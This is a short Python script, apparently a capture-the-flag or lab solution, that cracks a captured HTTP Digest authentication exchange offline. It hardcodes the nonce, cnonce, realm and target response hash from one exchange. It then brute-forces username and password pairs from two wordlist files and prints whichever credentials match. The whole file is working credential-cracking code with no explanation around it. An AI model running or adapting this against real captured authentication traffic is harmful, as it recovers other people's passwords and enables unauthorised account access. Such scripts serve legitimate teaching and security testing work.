from hashlib import md5


method_uri = "GET:/".encode('utf-8')


hash2 = md5(method_uri).hexdigest()


realm = "members only".encode('utf-8')


colon = ":".encode('utf-8')


qop = "auth".encode('utf-8')


cnonce = "e185c54236ba047b".encode('utf-8')


nonce = "7zD5AKLrBQA=f4e09d16400b6b9931f2a99f3742813eac14a918".encode('utf-8')


nc = "00000001".encode('utf-8')

response = "13d646ff24a73a157d0e6a3675bab724"



usrs = open("usrlst.txt", 'r')



for usr in usrs.read().split('\n'):

	usr2=usr.encode('utf-8')

	pwds = open("pwdlst.txt", 'r')

	for pwd in pwds.read().split('\n'):

		pwd2=pwd.encode('utf-8')

		hash1 = md5(usr2+colon+realm+colon+pwd2).hexdigest()

		computed_response = md5(hash1.encode('utf-8')+colon+nonce+colon+nc+colon+cnonce+colon+qop+colon+hash2.encode('utf-8')).hexdigest()

		if computed_response in response:

			print('Cracked successfully')

			print('The computed response value: %s'%computed_response)

			print('The username: %s'%usr)

			print('The password: %s'%pwd)

		else:

        		pass
